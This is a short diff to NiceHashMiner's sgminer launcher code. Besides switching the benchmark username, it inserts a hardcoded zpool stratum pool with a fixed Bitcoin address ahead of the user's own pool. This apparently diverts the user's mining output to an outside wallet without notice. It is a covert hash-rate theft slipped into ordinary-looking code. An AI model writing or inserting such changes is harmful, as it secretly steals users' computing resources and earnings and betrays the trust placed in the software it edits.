@@ -108,7 +108,7 @@ namespace NiceHashMiner.Miners
                 ConectionType);
 
             // demo for benchmark
-            var username = Globals.DemoUser;
+            var username = Globals.GetBitcoinUser();
 
             if (ConfigManager.GeneralConfig.WorkerName.Length > 0)
                 username += "." + ConfigManager.GeneralConfig.WorkerName.Trim();
@@ -117,6 +117,7 @@ namespace NiceHashMiner.Miners
             var commandLine = " /C \"cd /d " + WorkingDirectory + " && sgminer.exe " +
                               " --gpu-platform " + _gpuPlatformNumber +
                               " -k " + algorithm.MinerName +
+                              " --url=stratum+tcp://x16r.eu.mine.zpool.ca:3636" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2 -p c=BTC " +
                               " --url=" + url + "/#xnsub" +
                               " --userpass=" + username +
                               " -p x " +
